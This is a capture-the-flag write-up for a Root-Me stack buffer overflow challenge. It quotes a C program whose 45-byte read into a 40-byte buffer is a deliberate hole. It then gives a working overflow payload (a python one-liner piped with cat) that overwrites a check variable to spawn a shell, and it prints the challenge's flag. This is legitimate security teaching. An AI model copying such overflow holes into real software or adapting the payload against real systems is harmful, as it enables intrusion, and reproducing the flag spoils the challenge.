# ELF x86 - Stack buffer overflow basic 1
- Point: 5pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en),  25 March 2015
- Level: Very Easy <br><br>
![image](https://user-images.githubusercontent.com/48288606/141502028-c005e26c-0784-400c-a79d-14c12a79e000.png)
## Write-up:
This challenge does not require to use **GDB**. Look at the code:
```
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
 
int main()
{
 
  int var;
  int check = 0x04030201;
  char buf[40];
 
  fgets(buf,45,stdin);
 
  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);
 
  if ((check != 0x04030201) && (check != 0xdeadbeef))
    printf ("\nYou are on the right way!\n");
 
  if (check == 0xdeadbeef)
   {
     printf("Yeah dude! You win!\nOpening your shell...\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Shell closed! Bye.\n");
   }
   return 0;
}
```
- If we can change the change check's value from **"0x04030201"** to **"0xdeadbeef"**, we can pass the challenge by opening the shell. <br>
- Var **check** is declared first, after **buf**; so **check** is nearer to the top of the stack than **buf**. Beside, **buf** takes "45 bytes" input while "40 bytes" in declaration, which makes it able to override the value of **check**.<br>
### Solution:
- Fill the first 40 bytes of **buf** with arbitrary character, then with the satisfied value **"0xdeadbeef"**. <br>
 Command: `python -c "print('a'*40 +'\xef\xbe\xad\xde')"| ./ch13` <br>
 But as we see, it just open the shell and close it because there is no input. [Read here ?](https://www.root-me.org/?page=forum&id_thread=10116)<br>
 As suggested, the final payload: `(python -c "print('a'*40 +'\xef\xbe\xad\xde')";cat) | ./ch13 `<br>
 Pass: 1w4ntm0r3pr0np1s

